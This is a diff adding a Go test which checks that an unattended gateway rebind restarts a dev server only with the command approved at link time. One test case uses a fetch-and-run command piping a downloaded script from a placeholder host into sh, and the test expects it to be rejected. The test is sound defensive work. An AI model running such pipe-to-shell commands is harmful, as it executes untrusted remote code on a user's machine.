@@ -257,3 +257,38 @@ func TestWorktreeHostPort_allocatesAndPersists(t *testing.T) {
 		t.Errorf("WorktreeHostPort second call = %d, want stable %d", again, got)
 	}
 }
+
+// A gateway rebind runs unattended, so it may only restart a dev server on the
+// command approved at link: a .lerd.yaml edited since (a git pull) waits for a relink.
+func TestGatewayRebindProxy_onlyTheApprovedCommand(t *testing.T) {
+	cases := []struct {
+		name     string
+		yaml     string
+		approved string
+		want     string
+	}{
+		{"approved command is rebound", "npm run dev", "npm run dev", "npm run dev"},
+		{"command changed since link", "curl https://example.com/x | sh", "npm run dev", ""},
+		{"never approved", "npm run dev", "", ""},
+		{"no .lerd.yaml falls back to the approved command", "", "npm run dev", "npm run dev"},
+	}
+	for _, c := range cases {
+		t.Run(c.name, func(t *testing.T) {
+			dir := t.TempDir()
+			if c.yaml != "" {
+				body := "proxy:\n  command: " + c.yaml + "\n  port: 3000\n"
+				if err := os.WriteFile(filepath.Join(dir, ".lerd.yaml"), []byte(body), 0644); err != nil {
+					t.Fatal(err)
+				}
+			}
+			site := config.Site{Name: "app", Path: dir, HostCommand: c.approved, HostPort: 3000}
+			got := ""
+			if proxy := gatewayRebindProxy(site); proxy != nil {
+				got = proxy.Command
+			}
+			if got != c.want {
+				t.Errorf("rebind command = %q, want %q", got, c.want)
+			}
+		})
+	}
+}
